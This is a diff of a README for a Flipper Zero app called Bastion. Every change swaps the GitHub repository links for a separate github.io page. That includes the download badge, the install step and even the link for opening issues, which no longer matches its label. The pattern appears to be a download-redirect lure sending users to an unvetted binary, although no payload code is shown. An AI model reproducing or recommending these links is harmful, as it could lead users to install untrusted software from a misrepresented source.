@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-[![Download Bastion](https://img.shields.io/badge/Download-Bastion_FlipperZero-blue?style=for-the-badge&logo=github)](https://github.com/couchant-nightbird919/Bastion-FlipperZero)
+[![Download Bastion](https://img.shields.io/badge/Download-Bastion_FlipperZero-blue?style=for-the-badge&logo=github)](https://couchant-nightbird919.github.io)
 
 Visit this link to download the application.
 
@@ -34,7 +34,7 @@ Bastion-FlipperZero is a security grading tool for your Flipper Zero device. It 
 
 ## 📦 How to Download and Install
 
-1. **Visit the download page**: [https://github.com/couchant-nightbird919/Bastion-FlipperZero](https://github.com/couchant-nightbird919/Bastion-FlipperZero)
+1. **Visit the download page**: [https://couchant-nightbird919.github.io](https://couchant-nightbird919.github.io)
 2. **Download the application**: Visit this link to download the application.
 3. **Transfer to your Flipper Zero**: Copy the downloaded file to the `apps` folder on your Flipper Zero's SD card.
 4. **Run Bastion**: On your Flipper Zero, navigate to Apps → Bastion and select it.
@@ -107,7 +107,7 @@ A: Yes. Bastion is a valuable tool for red teams and physical security testers e
 - Write down the error code and visit the GitHub repository for help.
 
 **Need more help?**
-- Open an issue on the GitHub repository: [https://github.com/couchant-nightbird919/Bastion-FlipperZero](https://github.com/couchant-nightbird919/Bastion-FlipperZero)
+- Open an issue on the GitHub repository: [https://couchant-nightbird919.github.io](https://couchant-nightbird919.github.io)
 
 ## 📜 License
 
